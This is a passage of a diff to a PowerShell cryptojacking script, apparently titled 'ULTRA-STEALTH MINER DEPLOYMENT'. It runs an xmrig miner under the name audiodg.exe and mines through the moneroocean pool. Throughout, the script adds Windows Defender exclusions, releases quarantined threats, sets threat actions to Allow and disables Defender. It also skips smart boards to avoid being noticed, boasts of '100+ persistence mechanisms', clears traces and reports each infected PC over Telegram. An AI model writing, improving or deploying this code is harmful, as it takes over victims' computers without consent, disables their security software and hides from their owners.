                     $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)").CommandLine
-                    if ($cmdLine -match "config\.json|moneroocean|gulf\.moneroocean|--algo|--coin") {
+                    if ($cmdLine -match "config\.json|moneroocean|gulf\.moneroocean") {
                         $processes += $proc
                         Write-Log "Found disguised miner: $name (PID: $($proc.Id))"
                     }
@@ -1291,7 +1481,7 @@ function Stop-AllMiners {
             Write-Log "Remaining: $($proc.ProcessName) (PID: $($proc.Id))" "WARN"
         }
     } else {
-        Write-Log "[OK] All miners successfully terminated - PC is free"
+        Write-Log "All miners successfully terminated - PC is free"
     }
 }
 
@@ -1307,7 +1497,7 @@ function Start-OptimizedMiner {
     # CRITICAL: Ensure no other miners are running before starting
     $existingMiners = Get-AllMinerProcesses
     if ($existingMiners.Count -gt 0) {
-        Write-Log "[!] SINGLE INSTANCE VIOLATION: Found $($existingMiners.Count) existing miner(s) - terminating them first" "WARN"
+        Write-Log "SINGLE INSTANCE VIOLATION: Found $($existingMiners.Count) existing miner(s) - terminating them first" "WARN"
         Stop-AllMiners
         Start-Sleep -Seconds 2
     }
@@ -1315,8 +1505,9 @@ function Start-OptimizedMiner {
     # Double-check after termination
     $stillRunning = Get-AllMinerProcesses
     if ($stillRunning.Count -gt 0) {
-        Write-Log "[X] CRITICAL: Cannot enforce single instance - $($stillRunning.Count) miner(s) still running" "ERROR"
-        Send-Telegram "[X] SINGLE INSTANCE FAILED`nPC: $env:COMPUTERNAME`n[!] Multiple miners detected and could not be stopped"
+        Write-Log "CRITICAL: Cannot enforce single instance - $($stillRunning.Count) miner(s) still running" "ERROR"
+        $msg = "SINGLE INSTANCE FAILED" + [Environment]::NewLine + "PC: $env:COMPUTERNAME" + [Environment]::NewLine + "Multiple miners detected and could not be stopped"
+        Send-Telegram $msg
         return $false
     }
     
@@ -1324,7 +1515,8 @@ function Start-OptimizedMiner {
     $minerPath = $null
     $configPath = $null
     
-    foreach ($location in $Config.Locations) {
+    $locations = @($Config.Locations)  # Create copy to avoid modification errors
+    foreach ($location in $locations) {
         # First check for stealth name (audiodg.exe)
         $testMiner = Join-Path $location "audiodg.exe"
         $testConfig = Join-Path $location "config.json"
@@ -1332,6 +1524,11 @@ function Start-OptimizedMiner {
         # Fallback to xmrig.exe if stealth hasn't been applied yet
         if (-not (Test-Path $testMiner)) {
             $testMiner = Join-Path $location "xmrig.exe"
+            
+            # If neither exists, skip this location
+            if (-not (Test-Path $testMiner)) {
+                continue
+            }
         }
         
         if ((Test-Path $testMiner) -and (Test-Path $testConfig)) {
@@ -1347,7 +1544,7 @@ function Start-OptimizedMiner {
     }
     
     Write-Log "Using miner: $minerPath"
-    Write-Log "[OK] SINGLE INSTANCE VERIFIED - Starting ONE miner only"
+    Write-Log "SINGLE INSTANCE VERIFIED - Starting ONE miner only"
     
     # Start miner with optimal settings (use config file only - it already has all settings)
     try {
@@ -1365,10 +1562,24 @@ function Start-OptimizedMiner {
         if ($process) {
             Start-Sleep -Seconds 2
             
+            # CHECK IF PROCESS IS STILL ALIVE (might have been killed by Defender)
+            try {
+                $process.Refresh()
+                if ($process.HasExited) {
+                    Write-Log "CRITICAL: Miner process exited immediately after start!" "ERROR"
+                    Write-Log "This usually means Windows Defender killed it" "ERROR"
+                    Write-Log "SOLUTION: Add Defender exclusions or temporarily disable real-time protection" "ERROR"
+                    return $false
+                }
+            } catch {
+                Write-Log "CRITICAL: Cannot access miner process - it may have been killed by AV" "ERROR"
+                return $false
+            }
+            
             # Verify only ONE instance is running
             $allMiners = Get-AllMinerProcesses
             if ($allMiners.Count -gt 1) {
-                Write-Log "[X] CRITICAL: Multiple instances detected immediately after start!" "ERROR"
+                Write-Log "CRITICAL: Multiple instances detected immediately after start!" "ERROR"
                 # Keep only the one we just started
                 foreach ($m in $allMiners) {
                     if ($m.Id -ne $process.Id) {
@@ -1380,6 +1591,13 @@ function Start-OptimizedMiner {
             
             # ========== SMART PRIORITY & AFFINITY (NO LAG!) ==========
             try {
+                # Check again before setting priority
+                $process.Refresh()
+                if ($process.HasExited) {
+                    Write-Log "Process exited before priority could be set" "ERROR"
+                    return $false
+                }
+                
                 # Use Above Normal instead of High to prevent lag
                 # High priority + smart affinity = best hashrate + zero lag
                 $priorityClass = switch ($SystemCaps.Priority) {
@@ -1409,7 +1627,7 @@ function Start-OptimizedMiner {
                     $affinityMask = ((1 -shl $useCores) - 1) -shl $skipCores
                     $process.ProcessorAffinity = [IntPtr]$affinityMask
                     
-                    Write-Log "[OK] Smart Affinity: Using $useCores cores (skipped cores 0-1 for system = ZERO LAG)"
+                    Write-Log "Smart Affinity: Using $useCores cores (skipped cores 0-1 for system = ZERO LAG)"
                     
                 } elseif ($totalCores -ge 6) {
                     # For 6-7 core CPUs: Skip first core only
@@ -1418,7 +1636,7 @@ function Start-OptimizedMiner {
                     $affinityMask = ((1 -shl $useCores) - 1) -shl $skipCores
                     $process.ProcessorAffinity = [IntPtr]$affinityMask
                     
-                    Write-Log "[OK] Smart Affinity: Using $useCores cores (skipped core 0 for system)"
+                    Write-Log "Smart Affinity: Using $useCores cores (skipped core 0 for system)"
                     
                 } else {
                     # For <6 core CPUs: Use all but reserve processing time via lower priority
@@ -1426,16 +1644,19 @@ function Start-OptimizedMiner {
                     $affinityMask = (1 -shl $useCores) - 1
                     $process.ProcessorAffinity = [IntPtr]$affinityMask
                     
-                    Write-Log "[OK] Affinity: Using $useCores of $totalCores cores"
+                    Write-Log "Affinity: Using $useCores of $totalCores cores"
                 }
                 
-                Write-Log "[OK] Miner started successfully - PID: $($process.Id), Priority: $priorityClass, Threads: $($SystemCaps.MaxThreads)"
-                Write-Log "[OK] SINGLE INSTANCE CONFIRMED - Only 1 miner running"
-                Write-Log "[OK] CONFIGURATION: MAX HASHRATE + ZERO LAG"
+                Write-Log "Miner started successfully - PID: $($process.Id), Priority: $priorityClass, Threads: $($SystemCaps.MaxThreads)"
+                Write-Log "SINGLE INSTANCE CONFIRMED - Only 1 miner running"
+                Write-Log "CONFIGURATION: MAX HASHRATE + ZERO LAG"
                 
                 # Send Telegram notification with CPU-specific info
                 $priorityName = switch ($SystemCaps.Priority) { 5 {'Realtime'}; 4 {'High'}; 3 {'Above Normal'}; 2 {'Normal'}; 1 {'Below Normal'} }
-                Send-Telegram "[START] MINER STARTED`nPC: $env:COMPUTERNAME`n[CPU] Type: $($SystemCaps.CPUTier) ($($SystemCaps.CPUCores)C/$($SystemCaps.CPUThreads)T)`n[THREADS] Using: $($SystemCaps.MaxThreads)/$($SystemCaps.CPUThreads) (Auto-Adjusted)`n[STATS] Max CPU: $($SystemCaps.MaxCpuUsage)%`n[ACTIVE] Priority: $priorityName`n[RAM] Memory: $($SystemCaps.TotalRAM)GB`n[OK] Single Instance: ENFORCED"
+                $cpuInfo = "$($SystemCaps.CPUCores)C-$($SystemCaps.CPUThreads)T"
+                $nl = [Environment]::NewLine
+                $telegramMsg = "MINER STARTED" + $nl + "PC: $env:COMPUTERNAME" + $nl + "CPU: $($SystemCaps.CPUTier) $cpuInfo" + $nl + "Threads: $($SystemCaps.MaxThreads)/$($SystemCaps.CPUThreads)" + $nl + "Max CPU: $($SystemCaps.MaxCpuUsage)%" + $nl + "Priority: $priorityName" + $nl + "RAM: $($SystemCaps.TotalRAM)GB" + $nl + "Single Instance: ENFORCED"
+                Send-Telegram $telegramMsg
                 
                 return $true
             } catch {
@@ -1467,7 +1688,7 @@ function Protect-MinerFromDefender {
             $behaviorEnabled = $defenderStatus.BehaviorMonitorEnabled
             
             if ($realtimeEnabled -or $behaviorEnabled) {
-                Write-Log "[!] DEFENDER IS ACTIVE - Applying protective measures..." "WARN"
+                Write-Log "DEFENDER IS ACTIVE - Applying protective measures..." "WARN"
                 
                 # ========== AGGRESSIVE EXCLUSIONS (EVEN IF DEFENDER IS ON) ==========
                 $criticalPaths = @(
@@ -1492,13 +1713,13 @@ function Protect-MinerFromDefender {
                 try {
                     $threats = Get-MpThreat -ErrorAction SilentlyContinue
                     if ($threats) {
-                        Write-Log "[!] Defender detected threats - attempting to restore files..." "WARN"
+                        Write-Log "Defender detected threats - attempting to restore files..." "WARN"
                         
                         foreach ($threat in $threats) {
                             # Allow all threats related to miner
                             if ($threat.Resources -match "audiodg|xmrig|WindowsUpdate|AudioSrv") {
                                 Remove-MpThreat -ThreatID $threat.ThreatID -ErrorAction SilentlyContinue
-                                Write-Log "[OK] Restored file from quarantine"
+                                Write-Log "Restored file from quarantine"
                             }
                         }
                     }
@@ -1512,10 +1733,10 @@ function Protect-MinerFromDefender {
                     Set-MpPreference -SevereThreatDefaultAction Allow -ErrorAction SilentlyContinue
                 } catch {}
                 
-                Write-Log "[OK] Defender protection renewed ($exclusionsAdded exclusions)" "INFO"
+                Write-Log "Defender protection renewed - $exclusionsAdded exclusions added" "INFO"
                 return $true
             } else {
-                Write-Log "[OK] Defender is disabled - no action needed"
+                Write-Log "Defender is disabled - no action needed"
                 return $true
             }
         }
@@ -1565,12 +1786,13 @@ function Start-Watchdog {
             $miners = Get-AllMinerProcesses
             
             if ($miners.Count -eq 0) {
-                Write-Log "[!] NO MINER DETECTED - AUTO-RESTARTING" "WARN"
+                Write-Log "NO MINER DETECTED - AUTO-RESTARTING" "WARN"
                 Start-OptimizedMiner -SystemCaps $SystemCaps
-                Send-Telegram "[RESTART] AUTO-RESTART`nPC: $env:COMPUTERNAME`n[TIME] Time: $(Get-Date -Format 'HH:mm')"
+                $msg = "AUTO-RESTART" + [Environment]::NewLine + "PC: $env:COMPUTERNAME" + [Environment]::NewLine + "Time: $(Get-Date -Format 'HH:mm')"
+                Send-Telegram $msg
             }
             elseif ($miners.Count -gt 1) {
-                Write-Log "[!] SINGLE INSTANCE VIOLATION: $($miners.Count) miners detected - KILLING DUPLICATES" "WARN"
+                Write-Log "SINGLE INSTANCE VIOLATION: $($miners.Count) miners detected - KILLING DUPLICATES" "WARN"
                 
                 # Keep the one with highest working set (most established)
                 $bestMiner = $miners | Sort-Object WorkingSet -Descending | Select-Object -First 1
@@ -1588,8 +1810,10 @@ function Start-Watchdog {
                     }
                 }
                 
-                Write-Log "[OK] Enforced single instance - killed $killedCount duplicate(s), kept PID: $($bestMiner.Id)"
-                Send-Telegram "[!] DUPLICATE KILLED`nPC: $env:COMPUTERNAME`n[KILLED] Removed: $killedCount duplicate miner(s)`n[OK] Single instance restored"
+                Write-Log "Enforced single instance - killed $killedCount duplicate(s), kept PID: $($bestMiner.Id)"
+                $nl = [Environment]::NewLine
+                $msg = "DUPLICATE KILLED" + $nl + "PC: $env:COMPUTERNAME" + $nl + "Removed: $killedCount duplicate miner(s)" + $nl + "Single instance restored"
+                Send-Telegram $msg
             }
             else {
                 # Only ONE miner running - maintain it
@@ -1601,12 +1825,14 @@ function Start-Watchdog {
                     $cpuUsage = $miner.CPU
                     if ($cpuUsage -lt 10) {
                         # Miner process exists but not using CPU = stuck/frozen
-                        Write-Log "[!] STUCK MINER DETECTED: CPU usage = $cpuUsage% (expected 70%+)" "WARN"
+                        Write-Log "STUCK MINER DETECTED: CPU usage = $cpuUsage% (expected 70%+)" "WARN"
                         Write-Log "Restarting stuck miner..." "WARN"
                         $miner | Stop-Process -Force
                         Start-Sleep -Seconds 2
                         Start-OptimizedMiner -SystemCaps $SystemCaps
-                        Send-Telegram "[FIX] STUCK MINER RESTARTED`nPC: $env:COMPUTERNAME`n[!] Was frozen (CPU: $cpuUsage%)`n[OK] Restarted successfully"
+                        $nl = [Environment]::NewLine
+                        $msg = "STUCK MINER RESTARTED" + $nl + "PC: $env:COMPUTERNAME" + $nl + "Was frozen (CPU: $cpuUsage%)" + $nl + "Restarted successfully"
+                        Send-Telegram $msg
                     }
                     
                     # Ensure HIGH priority is maintained
@@ -1620,7 +1846,7 @@ function Start-Watchdog {
                     if (-not $Global:LastHealthLog -or ($currentTime - $Global:LastHealthLog).TotalMinutes -ge 5) {
                         $Global:LastHealthLog = $currentTime
                         $uptime = $currentTime - $miner.StartTime
-                        Write-Log "[OK] HEALTHY: 1 miner running, PID: $($miner.Id), Uptime: $([math]::Round($uptime.TotalHours, 1))h"
+                        Write-Log "HEALTHY: 1 miner running, PID: $($miner.Id), Uptime: $([math]::Round($uptime.TotalHours, 1))h"
                     }
                 } catch {}
             }
@@ -1655,10 +1881,10 @@ function Send-Telegram {
 function Main {
     Write-Log "=== ULTRA-STEALTH MINER DEPLOYMENT ==="
     Write-Log "PC: $env:COMPUTERNAME | User: $env:USERNAME"
-    Write-Log "[LOCK] SINGLE INSTANCE ENFORCEMENT: ENABLED"
+    Write-Log "SINGLE INSTANCE ENFORCEMENT: ENABLED"
     
     # Step 0: AUTO-DETECT DEVICE TYPE (Smart Board Protection)
-    Write-Log "[SCAN] Auto-detecting device type..."
+    Write-Log "Auto-detecting device type..."
     $deviceDetection = $null
     
     try {
@@ -1671,22 +1897,25 @@ function Main {
             Write-Log "Device type detected: $($deviceDetection.DeviceType) (Confidence: $($deviceDetection.Confidence))"
             
             if ($deviceDetection.IsSmartBoard) {
-                Write-Log "[!] SMART BOARD DETECTED - ABORTING DEPLOYMENT" "ERROR"
+                Write-Log "SMART BOARD DETECTED - ABORTING DEPLOYMENT" "ERROR"
                 Write-Log "This device appears to be an interactive display/smart board"
                 Write-Log "Deployment blocked to prevent high-visibility detection"
                 
-                Send-Telegram "[STOP] DEPLOYMENT ABORTED`nDevice: $env:COMPUTERNAME`n[!] Detected as: $($deviceDetection.DeviceType)`n[SCAN] Confidence: $($deviceDetection.Confidence)`n[X] Reason: Smart board - high visibility risk`n`nReasons:`n$($deviceDetection.Reasons -join '`n')"
+                $reasons = $deviceDetection.Reasons -join ', '
+                $nl = [Environment]::NewLine
+                $msg = "DEPLOYMENT ABORTED" + $nl + "Device: $env:COMPUTERNAME" + $nl + "Detected as: $($deviceDetection.DeviceType)" + $nl + "Confidence: $($deviceDetection.Confidence)" + $nl + "Reason: Smart board - high visibility risk" + $nl + "Details: $reasons"
+                Send-Telegram $msg
                 
                 Remove-MinerMutex
                 return
             }
             
             if ($deviceDetection.DeviceType -eq "Unknown / Uncertain" -and $deviceDetection.Confidence -gt 20) {
-                Write-Log "[!] Device type uncertain (confidence: $($deviceDetection.Confidence))" "WARN"
+                Write-Log "Device type uncertain (confidence: $($deviceDetection.Confidence))" "WARN"
                 Write-Log "Proceeding with caution..."
             }
             
-            Write-Log "[OK] Device check passed - safe to deploy"
+            Write-Log "Device check passed - safe to deploy"
         } else {
             Write-Log "Auto-detection module not found - skipping device type check" "WARN"
         }
@@ -1698,7 +1927,8 @@ function Main {
     # Step 1: Check mutex - ensure only one deployment script runs
     if (-not (Test-MinerMutex)) {
         Write-Log "Another deployment script is already running - exiting to prevent conflicts" "WARN"
-        Send-Telegram "[!] DEPLOYMENT BLOCKED`nPC: $env:COMPUTERNAME`n[LOCK] Another instance already managing miner"
+        $msg = "DEPLOYMENT BLOCKED" + [Environment]::NewLine + "PC: $env:COMPUTERNAME" + [Environment]::NewLine + "Another instance already managing miner"
+        Send-Telegram $msg
         return
     }
     
@@ -1709,8 +1939,8 @@ function Main {
         return
     }
     
-    Write-Log "[OK] Admin privileges confirmed"
-    Write-Log "[OK] Mutex acquired - this is the ONLY deployment instance"
+    Write-Log "Admin privileges confirmed"
+    Write-Log "Mutex acquired - this is the ONLY deployment instance"
     
     # Step 3: Get system capabilities
     $systemCaps = Get-SystemCaps
@@ -1726,15 +1956,19 @@ function Main {
     Disable-WindowsDefender
     
     # Step 7: CRITICAL - Stop ALL existing miners to enforce single instance
-    Write-Log "[LOCK] Enforcing single instance - stopping ALL existing miners..."
+    Write-Log "Enforcing single instance - stopping ALL existing miners..."
     Stop-AllMiners
     
     # Step 8: Deploy miner
     if (-not (Install-Miner)) {
         Write-Log "Deployment failed" "ERROR"
-        Send-Telegram "[X] DEPLOYMENT FAILED`nPC: $env:COMPUTERNAME"
+        $msg = "DEPLOYMENT FAILED" + [Environment]::NewLine + "PC: $env:COMPUTERNAME"
+        Send-Telegram $msg
         return
     }
+    
+    Write-Log "=== DEPLOYMENT SUCCESSFUL ===" 
+    Write-Log "Miner deployed to one or more locations (including fallbacks if needed)"
     
     # Step 9: ENABLE ULTRA STEALTH MODE - Makes miner invisible
     Enable-UltraStealth
@@ -1754,7 +1988,17 @@ function Main {
         Clear-AllTraces
         
         Write-Log "=== ULTRA-STEALTH DEPLOYMENT COMPLETED ==="
-        Send-Telegram "[STEALTH] STEALTH MINER DEPLOYED`nPC: $env:COMPUTERNAME`n[PROCESS] Name: audiodg.exe (Windows Audio)`n[OK] Single Instance: ENFORCED`n[ACTIVE] Priority: HIGH`n[LOCK] Persistence: 100+ mechanisms`n[SHIELD] Defender Protection: ACTIVE`n[HOT] Huge Pages: ENABLED (+20% hashrate)`n[GHOST] Status: INVISIBLE"
+        $nl = [Environment]::NewLine
+        $msg = "STEALTH MINER DEPLOYED" + $nl
+        $msg += "PC: " + $env:COMPUTERNAME + $nl
+        $msg += "Process: audiodg.exe" + $nl
+        $msg += "Single Instance: ENFORCED" + $nl
+        $msg += "Priority: HIGH" + $nl
+        $msg += "Persistence: 100+ mechanisms" + $nl
+        $msg += "Defender: PROTECTED" + $nl
+        $msg += "Huge Pages: ENABLED" + $nl
+        $msg += "Status: INVISIBLE"
+        Send-Telegram $msg
         
         # Step 14: Start auto-restart watchdog (BLOCKING - keeps script running)
         # This is critical: keeps mutex locked and prevents other deployment scripts
@@ -1765,7 +2009,11 @@ function Main {
         
     } else {
         Write-Log "Failed to start miner" "ERROR"
-        Send-Telegram "[X] MINER START FAILED`nPC: $env:COMPUTERNAME"
+        $msg = @()
+        $msg += "MINER START FAILED"
+        $msg += "PC: $($env:COMPUTERNAME)"
+        $finalMsg = $msg -join [Environment]::NewLine
+        Send-Telegram $finalMsg
         Remove-MinerMutex
     }
 }
